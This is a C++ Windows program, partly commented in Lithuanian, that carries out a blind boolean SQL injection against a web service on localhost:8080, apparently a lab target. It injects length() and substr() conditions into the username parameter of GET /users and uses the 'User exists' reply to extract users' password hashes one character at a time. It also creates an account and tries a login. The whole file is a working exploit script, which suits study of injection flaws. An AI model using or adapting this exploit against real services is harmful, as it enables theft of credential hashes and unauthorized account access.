#include <winsock2.h>
#include <iostream>
#include <string>
#include <cctype>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

string urlEncode(const string& input) {
    static const char* hex = "0123456789ABCDEF";
    string encoded;
    encoded.reserve(input.size() * 3);

    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded.push_back(static_cast<char>(c));
        } else {
            encoded.push_back('%');
            encoded.push_back(hex[(c >> 4) & 0x0F]);
            encoded.push_back(hex[c & 0x0F]);
        }
    }

    return encoded;
}

int getHttpStatusCode(const string& response) {
    size_t start = response.find("HTTP/");
    if (start == string::npos) {
        return -1;
    }

    size_t codePosition = response.find(' ', start);
    if (codePosition == string::npos || codePosition + 3 >= response.size()) {
        return -1;
    }

    return stoi(response.substr(codePosition + 1, 3));
}

string getHttpBody(const string& response) {
    size_t bodyPos = response.find("\r\n\r\n");
    if (bodyPos == string::npos) {
        return "";
    }
    return response.substr(bodyPos + 4);
}

// Funkcija HTTP užklausai siųsti
string sendRequest(const string& request) {
    WSADATA winSockData;
    SOCKET s;
    struct sockaddr_in server;
    char buffer[8192];

    if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
        cout << "[-] WSAStartup failed\n";
        return "";
    }

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        cout << "[-] Socket creation failed (" << WSAGetLastError() << ")\n";
        WSACleanup();
        return "";
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        cout << "[!] Connection failed to 127.0.0.1:8080 (" << WSAGetLastError() << ")\n";
        closesocket(s);
        WSACleanup();
        return "";
    }

    int totalSent = 0;
    int requestSize = static_cast<int>(request.size());
    while (totalSent < requestSize) {
        int sent = send(s, request.c_str() + totalSent, requestSize - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            cout << "[!] Send failed (" << WSAGetLastError() << ")\n";
            closesocket(s);
            WSACleanup();
            return "";
        }
        totalSent += sent;
    }

    string response;
    while (true) {
        int recv_size = recv(s, buffer, sizeof(buffer), 0);
        if (recv_size == SOCKET_ERROR) {
            cout << "[!] Receive failed (" << WSAGetLastError() << ")\n";
            closesocket(s);
            WSACleanup();
            return "";
        }
        if (recv_size == 0) {
            break;
        }
        response.append(buffer, recv_size);
    }

    closesocket(s);
    WSACleanup();

    return response;
}

// Hash ilgio radimas
int findHashLength(string user) {
    for (int len = 1; len <= 40; len++) {

        string payload = user + "' AND length(password)=" + to_string(len) + " -- ";
        string encodedPayload = urlEncode(payload);

        string request =
            "GET /users?username=" + encodedPayload + " HTTP/1.1\r\n"
            "Host: localhost:8080\r\n"
            "Connection: close\r\n\r\n";

        string response = sendRequest(request);
        if (response.empty()) {
            cout << "[!] HTTP request failed while checking hash length\n";
            return -1;
        }

        int statusCode = getHttpStatusCode(response);
        if (statusCode != 200) {
            cout << "[!] Unexpected HTTP status while checking hash length: " << statusCode << endl;
            return -1;
        }

        if (response.find("User exists") != string::npos) {
            cout << "[+] Hash ilgis: " << len << endl;
            return len;
        }
    }

    cout << "[-] Nepavyko rasti hash ilgio\n";
    return -1;
}

// Hash išgavimas
string extractHash(string user, int length) {
    string charset = "0123456789abcdef";
    string hash = "";

    for (int pos = 1; pos <= length; pos++) {
        bool found = false;

        for (char c : charset) {

            string payload = user + "' AND substr(password," + to_string(pos) + ",1)='" + c + "' -- ";
            string encodedPayload = urlEncode(payload);

            string request =
                "GET /users?username=" + encodedPayload + " HTTP/1.1\r\n"
                "Host: localhost:8080\r\n"
                "Connection: close\r\n\r\n";

            string response = sendRequest(request);
            if (response.empty()) {
                cout << "\n[!] HTTP request failed while extracting hash\n";
                return "";
            }

            int statusCode = getHttpStatusCode(response);
            if (statusCode != 200) {
                cout << "\n[!] Unexpected HTTP status while extracting hash: " << statusCode << endl;
                return "";
            }

            if (response.find("User exists") != string::npos) {
                hash += c;
                if (pos % 5 == 0 || pos == length) {
                    cout << "\r[+] Hash extraction progress: " << pos << "/" << length << flush;
                }
                found = true;
                break;
            }
        }

        if (!found) {
            cout << "\n[-] Nerastas simbolis pozicijoje " << pos << endl;
            hash += "?";
        }
    }

    cout << endl;

    return hash;
}

// Naujo vartotojo sukūrimas
bool createUser(const string& userName,
                const string& firstName,
                const string& lastName,
                const string& password) {

    string json = "{"
        "\"userName\":\"" + userName + "\","
        "\"userFName\":\"" + firstName + "\","
        "\"userLName\":\"" + lastName + "\","
        "\"password\":\"" + password + "\""
    "}";

    string request =
        "POST /users HTTP/1.1\r\n"
        "Host: localhost:8080\r\n"
        "Content-Type: application/json\r\n"
        "Accept: application/json\r\n"
        "Content-Length: " + to_string(json.size()) + "\r\n"
        "Connection: close\r\n"
        "\r\n" +
        json;

    string response = sendRequest(request);
    if (response.empty()) {
        cout << "[-] User creation failed: no HTTP response\n";
        return false;
    }

    int statusCode = getHttpStatusCode(response);
    string body = getHttpBody(response);

    if (statusCode >= 200 && statusCode < 300) {
        cout << "[+] User created successfully (HTTP " << statusCode << ")\n";
        return true;
    }

    cout << "[-] User creation failed (HTTP " << statusCode << ")\n";
    cout << "    Response body: " << body << endl;
    return false;
}
bool userExists(const string& user) {

    string encodedUser = user;

    string request =
        "GET /users?username=" + encodedUser + " HTTP/1.1\r\n"
        "Host: localhost:8080\r\n"
        "Connection: close\r\n\r\n";

    string response = sendRequest(request);
    if (response.empty()) {
        cout << "[-] Failed to check if user exists\n";
        return false;
    }

    int statusCode = getHttpStatusCode(response);
    if (statusCode != 200) {
        cout << "[-] Unexpected HTTP status while checking user: " << statusCode << endl;
        return false;
    }

    string body = getHttpBody(response);
    string bodyLower = body;
    for (char &c : bodyLower) c = tolower(c);

    return bodyLower.find("user exists") != string::npos;
}
bool loginUser(const string& userName, const string& password) {

    string json = "{"
        "\"userName\":\"" + userName + "\","
        "\"password\":\"" + password + "\""
    "}";

    string request =
        "POST /login HTTP/1.1\r\n"
        "Host: localhost:8080\r\n"
        "Content-Type: application/json\r\n"
        "Accept: application/json\r\n"
        "Content-Length: " + to_string(json.size()) + "\r\n"
        "Connection: close\r\n"
        "\r\n" +
        json;

    string response = sendRequest(request);
    if (response.empty()) {
        cout << "[-] Login failed: no HTTP response\n";
        return false;
    }

    int statusCode = getHttpStatusCode(response);
    string body = getHttpBody(response);

    if (statusCode >= 200 && statusCode < 300) {
        cout << "[+] Login successful (HTTP " << statusCode << ")\n";
        return true;
    }

    cout << "[-] Login failed (HTTP " << statusCode << ")\n";
    return false;
}
int main(int argc, char* argv[]) {

    if (argc < 3) {
        cout << "Using: " << argv[0] << " <existingUser> <newUser>\n";
        return 1;
    }

    string existingUser = argv[1];
    string newUser = argv[2];
    if(userExists(existingUser)){
    cout << "=== existing user password hash ===\n";

    int len = findHashLength(existingUser);
    if (len == -1) return 1;

    string hash = extractHash(existingUser, len);
    if (hash.empty()) return 1;

    cout << "\n[+] " << existingUser << " password hash: " << hash << endl;
    }
    else cout << "[-] User " << existingUser << " does not exist" << endl;
    if(userExists(newUser) == false){
    cout << "\n=== creating new user ===\n";

    if (!createUser(newUser, "Alexander", "Bob", "guessme")) {
        cout << "[!] Continuing without creating new user\n";
    }
    }
    else cout << "[!] User " << newUser << " already exists" << endl;
    cout << endl;
    cout << "\n=== new user password hash ===\n";

    int newLen = findHashLength(newUser);
    if (newLen == -1) return 1;

    string newHash = extractHash(newUser, newLen);
    if (newHash.empty()) return 1;

    cout << "\n[+] " << newUser << " password hash: " << newHash << endl;
    cout << endl;
    cout << "\n=== Experiment: logging in with the new user ===\n";
    loginUser(newUser, "guessme");
    return 0;
}